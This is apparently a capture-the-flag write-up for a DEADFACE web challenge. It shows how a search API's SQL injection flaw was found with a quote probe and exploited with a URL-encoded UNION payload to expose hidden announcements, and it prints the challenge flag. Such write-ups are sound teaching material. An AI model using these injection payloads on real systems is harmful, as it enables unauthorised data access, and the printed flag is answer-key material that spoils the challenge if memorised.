## **Challenge Name: notSoPublicDomain**

### **Description**

DEADFACE was able to retrieve an announcement that was hidden by administrators. This announcement contained sensitive information (flag) that DEADFACE was able to compromise. Find the flag associated with the hidden announcement.

Submit the flag as deadface{flag text}.

**Challenge URL**: `http://env01.deadface.io:8080`

---

### **Approach**

1. **Understanding Hidden Announcements**  
   - The admin page mentioned: "Hidden announcements are not displayed in this interface. Database queries may reveal additional records..."
   - This suggested using SQL injection to find hidden announcements

2. **SQL Injection in Search API**  
   - Used the search API endpoint: `/api/search.php?q=test&type=announcements`
   - Added a single quote to test for SQL injection:
     ```
     GET /api/search.php?q=test'&type=announcements
     ```
   - Received SQL error confirming vulnerability

3. **Extracting Hidden Announcements**  
   - Used UNION-based SQL injection to bypass the `is_hidden = 0` filter:
     ```
     http://env01.deadface.io:8080/api/search.php?q=%25%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%20--%20-&type=announcements
     ```
   - This returned all announcements including hidden ones

4. **Finding the Flag**  
   - Found the flag in a hidden announcement:
     ```json
     {
         "title": "Restricted Access Notice",
         "content": "FLAG: deadface{h1dd3n_4nn0unc3m3nts_r3v34l_s3cr3ts}",
         "author": "System Administrator",
         "posted_at": "2025-10-25 18:26:37"
     }
     ```

---

### **Flag**

```
deadface{h1dd3n_4nn0unc3m3nts_r3v34l_s3cr3ts}
```

---

